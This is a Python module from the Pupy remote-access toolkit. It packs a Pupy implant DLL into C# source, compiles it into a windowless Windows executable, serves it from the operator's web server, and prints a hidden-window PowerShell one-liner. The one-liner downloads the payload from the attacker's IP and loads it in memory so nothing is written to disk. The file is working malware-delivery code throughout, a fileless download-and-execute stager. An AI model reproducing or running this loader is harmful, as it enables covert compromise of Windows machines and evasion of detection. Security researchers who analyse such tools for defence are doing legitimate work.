# -*- coding: utf-8 -*-
#Author: @n1nj4sec
#Contributor(s):

import os, subprocess, tempfile, random, string
from pupylib.PupyOutput import Success, Error, Warn, List
from pupygen import ROOT
import pupygen


class DotNetPayload():
    def __init__(self, display, conf, outpath=None, output_dir=None):
        self.display=display
        self.conf=conf
        self.outpath=outpath
        self.output_dir=output_dir

    def gen_source(self, random_path=False):
        with open(os.path.join(ROOT, "payload_templates", "PupyLoaderTemplate.cs"), 'rb') as f:
            template_source=f.read()
        rawdll = pupygen.generate_binary_from_template(self.display, self.conf, 'windows', arch='x64', shared=True)[0]
        self.display(Success("packing pupy into C# source ..."))
        encoded = '{' + ','.join([str(ord(c)) for c in rawdll]) + '}'
        content=template_source.replace('<PUPYx64_BYTES>', encoded)
        if not self.outpath or random_path:
            outfile = tempfile.NamedTemporaryFile(
                dir=self.output_dir or '.',
                prefix='pupy_',
                suffix='.cs',
                delete=False
            )
        else:
            outfile = self.outfile
        outfile.write(content)
        outfile.close()
        return outfile.name

    def gen_exe(self):
        sourcepath=self.gen_source(random_path=True)
        if not self.outpath:
            outfile = os.path.join(self.output_dir or '.', "pupy_"+''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(8))+".exe")
        else:
            outfile = self.outfile
        try:
            command=["mcs"]
            if not self.conf.get('debug', False):
                command.append("-target:winexe")
            command += ["-unsafe", "-OUT:"+outfile, sourcepath]
            self.display(Success("compiling via mono command: {}".format(' '.join(command))))
            try:
                self.display(subprocess.check_output(command))
            except subprocess.CalledProcessError as e:
                self.display(Error("Mono compilation failed: {}".format(e.output)))
                return None
            except OSError:
                self.display(Error("mcs compiler can't be found ... install mono-mcs package"))
                return None
        finally:
            os.unlink(sourcepath)
        return outfile


def serve_payload(display, server, conf, link_ip="<your_ip>"):
    if not server:
        display(Error('Oneliners only supported from pupysh'))
        return

    if not server.pupweb:
        display(Error('Webserver disabled'))
        return
    dn=DotNetPayload(display, conf)
    exe_path=dn.gen_exe()
    with open(exe_path, 'rb') as r:
        payload=r.read()
    os.unlink(exe_path)

    landing_uri = server.pupweb.serve_content(payload, alias='.NET payload')

    display(Warn('Only works with powershell version >= 3'))

    display(List([
        "powershell -w hidden -c \"[Reflection.Assembly]::Load((new-object net.webclient).DownloadData('http://{}:{}{}')).GetTypes()[0].GetMethods()[0].Invoke($null,@())\"".format(
            link_ip, server.pupweb.port, landing_uri),
    ], caption=Success(
        'Copy/paste this one-line loader to deploy pupy without writing on the disk')))




